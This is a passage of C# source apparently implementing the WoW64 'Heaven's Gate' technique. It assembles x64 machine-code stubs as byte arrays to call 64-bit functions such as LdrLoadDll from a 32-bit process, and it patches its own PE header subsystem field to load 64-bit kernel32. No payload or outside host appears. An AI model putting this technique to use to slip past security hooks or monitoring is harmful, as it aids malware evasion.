            IntPtr uniStr64Ptr = Marshal.AllocHGlobal(Marshal.SizeOf(uniStr64));

            Marshal.StructureToPtr(uniStr64, uniStr64Ptr, false);

            IntPtr modulePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UlongResult)));


            ulong[] LdrLoadDllParams = new ulong[] { 0, 0, (ulong)uniStr64Ptr, (ulong)modulePtr };

            ulong result = Execute64(LdrLoadDll, LdrLoadDllParams);

            ModuleHandle = Marshal.PtrToStructure<UlongResult>(modulePtr).Value;

            Marshal.FreeHGlobal(uniStr64Ptr);
            Marshal.FreeHGlobal(modulePtr);
            return result == 0;
        }

        public ulong LoadLibrary64(string ModuleName, out bool worked) 
        {
            ulong res = 0;
            worked = LoadLibrary64(ref res, ModuleName);
            return res;
        }

        public ulong LoadLibrary64(string ModuleName) 
        {
            return LoadLibrary64(ModuleName, out bool _);
        }

        public ulong Execute64(ulong Function, ulong[] pFunctionParameters)
        {
            int dwParameters = pFunctionParameters.Length;

            //BITS 64
            byte[] prologue = {
                0xFC,										//cld
		        0x48, 0x89, 0xCE,							//mov rsi, rcx
		        0x48, 0x89, 0xE7,							//mov rdi, rsp
		        0x48, 0x83, 0xEC, 0x10,						//sub rsp, 0x10
		        0x40, 0x80, 0xE4, 0x00,						//and spl, 0x0
	        };

            //BITS 64
            byte[] epilogue = {
                0x31, 0xC0,														//xor eax, eax
		        0x49, 0xBA, 0xF1, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,		//mov r10, FunctionAddress
		        0x41, 0xFF, 0xD2,												//call r10
		        0x48, 0x89, 0xFC,												//mov rsp, rdi
		        0xC3															//ret
	        };

            List<byte> code = new List<byte>(prologue);

            if (dwParameters < 4)
            {
                int c = dwParameters < 4 ? dwParameters : 4;
                for (int i = 0; i < c; ++i)
                {
                    switch (i)
                    {
                        case 0:
                            //mov rcx, qword ptr ds:[rsi]
                            code.AddRange(new byte[] { 0x48, 0x8B, 0x0E });
                            break;
                        case 1:
                            //mov rdx, qword ptr ds:[rsi + 0x8]
                            code.AddRange(new byte[] { 0x48, 0x8B, 0x56, 0x08 });
                            break;
                        case 2:
                            //mov r8, qword ptr ds:[rsi + 0x10]
                            code.AddRange(new byte[] { 0x4C, 0x8B, 0x46, 0x10 });
                            break;
                        case 3:
                            //mov r9, qword ptr ds:[rsi + 0x18]
                            code.AddRange(new byte[] { 0x4C, 0x8B, 0x4E, 0x18 });
                            break;
                    }
                }
            }
            else
            {
                //all the switch statements combined
                code.AddRange(new byte[] { 0x48, 0x8B, 0x0E, 0x48, 0x8B, 0x56, 0x08, 0x4C, 0x8B, 0x46, 0x10, 0x4C, 0x8B, 0x4E, 0x18 });
                if ((dwParameters % 2) != 0)
                {
                    // push 0x0
                    code.AddRange(new byte[] { 0x6A, 0x00 });
                }
                byte[] code_buffer1 = new byte[] { 0x48, 0x8B, 0x46, 0x20, 0x50 };
                byte[] code_buffer2 = new byte[] { 0x48, 0x8B, 0x86, 0x80, 0x00, 0x00, 0x00, 0x50 };

                if (dwParameters * 8 >= 0x7fffffff)
                {
                    return ulong.MaxValue;
                }

                for (int i = dwParameters - 1; i >= 4; --i)
                {
                    if (i * 8 < 0x7f)
                    {
                        code_buffer1[3] = (byte)(i * 8);
                        code.AddRange(code_buffer1);
                    }
                    else
                    {
                        BitConverter.GetBytes(i * 8).CopyTo(code_buffer2, 3);
                        code.AddRange(code_buffer2);
                    }
                }

            }

            code.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });

            BitConverter.GetBytes(Function).CopyTo(epilogue, 4);
            code.AddRange(epilogue);

            return DispatchX64Call(code.ToArray(), pFunctionParameters);
        }

        public bool LoadKernel32(ref ulong ModuleHandle) 
        {
            if (kernel32 != 0) 
            {
                ModuleHandle=kernel32;
                return true;
            }

            IntPtr NtHeaderAddr=SpecialNativeMethods.RtlImageNtHeader(NativeMethods.GetModuleHandleW(null));
            IMAGE_NT_HEADERS32 NtHeader = Marshal.PtrToStructure<IMAGE_NT_HEADERS32>(NtHeaderAddr);
            int subSystemAddress=(int)NtHeaderAddr+(int)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS32), "OptionalHeader")+(int)Marshal.OffsetOf(typeof(IMAGE_OPTIONAL_HEADER32), "Subsystem");

            uint oldProtect = 0;
            bool reset = false;
            uint PAGE_READWRITE = 0x04;
            ushort IMAGE_SUBSYSTEM_WINDOWS_CUI = 3;
            ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;


            ulong[] stdHandles = new ulong[4];
            uint[] flagHandles = new uint[2];
            if (NtHeader.OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_WINDOWS_CUI) 
            {
                if (NativeMethods.VirtualProtect((IntPtr)subSystemAddress, (uint)Marshal.SizeOf(typeof(ushort)), PAGE_READWRITE, ref oldProtect))
                {
                    if (!CaptureConsoleHandles64(ref stdHandles[0], ref stdHandles[1], ref stdHandles[2], ref stdHandles[3], ref flagHandles[0], ref flagHandles[1])) 
                    {
                        return false;
                    }
                    if (!WriteConsoleHandles64(0, 0, 0, 0, 0, 0)) //null out the handles
                    {
                        return false;
                    }

                    Marshal.WriteInt16((IntPtr)subSystemAddress, (short)IMAGE_SUBSYSTEM_WINDOWS_GUI);
                    reset = true;
                }
                else 
                {
                    return false;
                }
            }

            bool worked=LoadLibrary64(ref ModuleHandle, "kernel32.dll");

            if (worked) 
            {
                kernel32 = ModuleHandle;
            }

            if (reset) 
            {
                if (!WriteConsoleHandles64(stdHandles[0], stdHandles[1], stdHandles[2], stdHandles[3], flagHandles[0], flagHandles[1])) 
                {
                    return false;
                }
                Marshal.WriteInt16((IntPtr)subSystemAddress, (short)IMAGE_SUBSYSTEM_WINDOWS_CUI);
                NativeMethods.VirtualProtect((IntPtr)subSystemAddress, (uint)Marshal.SizeOf(typeof(ushort)), oldProtect, ref oldProtect);
            }

            return worked;
        }

        public ulong LoadKernel32(out bool worked) 
        {
            ulong res = 0;
            worked = LoadKernel32(ref res);
            return res;
        }

        public ulong LoadKernel32() 
        {
            return LoadKernel32(out bool _);
        }


    }

}
